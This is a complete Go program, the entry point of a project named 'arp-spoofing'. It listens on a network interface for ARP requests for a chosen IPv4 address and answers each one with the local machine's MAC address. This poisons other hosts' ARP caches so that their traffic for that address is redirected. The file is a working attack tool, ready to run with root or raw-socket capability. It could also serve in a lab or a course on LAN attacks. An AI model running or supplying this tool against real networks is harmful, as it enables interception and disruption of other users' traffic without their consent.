package main

import (
	"flag"
	"fmt"
	"os"

	"arp-spoofing/internal/arpapp"
	"github.com/mdlayher/arp"
)

func run(ifname, spoofedIPStr string) error {
	iface, myIP, err := arpapp.GetInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	spoofedIP, err := arpapp.ParseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	for {
		packet, _, err := client.Read()
		// 记录
		if err != nil {
			return fmt.Errorf("read ARP packet: %w", err)
		}
		// need to ARP request
		if packet.Operation != arp.OperationRequest {
			continue
		}
		// With this goal in mind
		if packet.TargetIP != spoofedIP {
			continue
		}

		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, packet.SenderIP, packet.SenderHardwareAddr)

		if err := client.Reply(packet, iface.HardwareAddr, spoofedIP); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
			continue
		}
		fmt.Printf("[+] Sent ARP reply: %s is at %s\n", spoofedIP, iface.HardwareAddr)
	}
}

func main() {
	var ifname, spoofedIP string
	flag.StringVar(&ifname, "i", "", "network interface")
	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
	flag.Parse()

	if ifname == "" || spoofedIP == "" {
		flag.Usage()
		os.Exit(1)
	}

	if err := run(ifname, spoofedIP); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
